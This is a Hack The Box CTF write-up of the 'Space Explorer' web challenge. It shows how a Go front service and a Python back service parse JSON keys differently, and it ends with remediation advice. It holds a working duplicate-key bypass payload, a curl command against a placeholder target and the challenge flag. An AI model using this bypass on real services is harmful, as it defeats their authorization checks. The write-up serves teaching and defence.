---
title: "Space Explorer Write-Up"
date: 2026-10-08
summary: "Hack The Box Space Explorer web challenge write-up covering inconsistent JSON parsing between a Go sender and a Python receiver."
difficulty: "Very Easy"
platform: "Hack The Box"
tags:
  - web
  - go
  - python
  - json
  - authentication-bypass
  - inconsistent-parsing
---

## Challenge overview

| Field | Details |
| --- | --- |
| Category | Web |
| Difficulty | Very Easy |
| Vulnerability | Inconsistent JSON parsing |
| Services | Go sender and Python receiver |

Space Explorer is a web challenge built from two services. A public Go application receives and validates the request, then forwards accepted requests to an internal Python service. The vulnerability appears because the two JSON parsers do not interpret key names in exactly the same way.

## Application architecture

The request passes through the following components:

1. The client sends JSON to the Go service on port `8080`.
2. Go unmarshals the body into `RequestData` and validates `Action`.
3. If the value is `getcosmic`, Go forwards the **original request body** to the internal service.
4. The Python service on port `8081` parses that same JSON again and performs the selected action.

```text
Client
  └── POST /execute
        └── Go sender :8080
              └── raw JSON body
                    └── Python receiver :8081
                          └── response / flag
```

## Sender analysis — Go

The Go service defines only one JSON field:

```go
type RequestData struct {
    Action string `json:"action"`
}
```

After parsing the body, the handler only forwards requests whose action is `getcosmic`:

```go
var requestData RequestData
if err := json.Unmarshal(body, &requestData); err != nil {
    http.Error(w, "Invalid JSON", http.StatusBadRequest)
    return
}

switch requestData.Action {
case "getcosmic":
    resp, err := http.Post(
        "http://localhost:8081/execute",
        "application/json",
        bytes.NewBuffer(body),
    )
    // ...
case "getSecureCode":
    w.Write([]byte("Access denied: Invalid security clearance"))
}
```

Two details are important:

- Go's `encoding/json` matches incoming object keys to struct fields without requiring the same letter case.
- When multiple matching keys appear, the later value overwrites the earlier value in `requestData.Action`.

The validation is therefore performed against Go's normalized view of the request, while the unmodified raw body is forwarded to Python.

## Receiver analysis — Python

The internal Flask service handles the protected action:

```python
data = request.get_json()

if 'action' not in data:
    return jsonify({"error": "No command received"}), 400

if data['action'] == "getcosmic":
    anomaly = random.choice(COSMIC_ANOMALIES)
    return jsonify(anomaly)
elif data['action'] == "getSecureCode":
    return jsonify({
        "flag": os.getenv("FLAG", "HTB{flag_not_set}"),
        "name": "Captain's Log"
    })
```

Python dictionaries are case-sensitive, so `action` and `Action` remain two distinct keys. The receiver specifically reads the lowercase key `action`.

## Exploitation

The payload supplies both spellings in a deliberate order:

```json
{
  "action": "getSecureCode",
  "Action": "getcosmic"
}
```

The same body is interpreted differently by each service:

| Parser | Result |
| --- | --- |
| Go sender | Both keys match the `Action` field; the final value is `getcosmic`, so validation succeeds. |
| Python receiver | `action` and `Action` are distinct; `data['action']` remains `getSecureCode`. |

The request can be sent with `curl`:

```bash
curl -s -X POST 'http://TARGET/execute' \
  -H 'Content-Type: application/json' \
  --data '{"action":"getSecureCode","Action":"getcosmic"}'
```

Go sees the allowed value and forwards the body. Python then selects `getSecureCode` from the lowercase key and returns the protected response.

## Flag

```text
HTB{C0SM1C-BYP4SS}
```

## Root cause and remediation

The root cause is a parser differential across a trust boundary: validation is performed using one parser's interpretation, but authorization-sensitive logic is later executed using a different parser's interpretation of the raw input.

Safer designs include:

- Rejecting JSON objects that contain keys differing only by letter case.
- Forwarding a newly serialized, validated structure instead of the original request body.
- Performing authorization in the service that executes the protected action.
- Defining and enforcing one canonical schema at every service boundary.

For this challenge, serializing `requestData` after validation and forwarding that canonical JSON would remove the ambiguity used by the exploit.
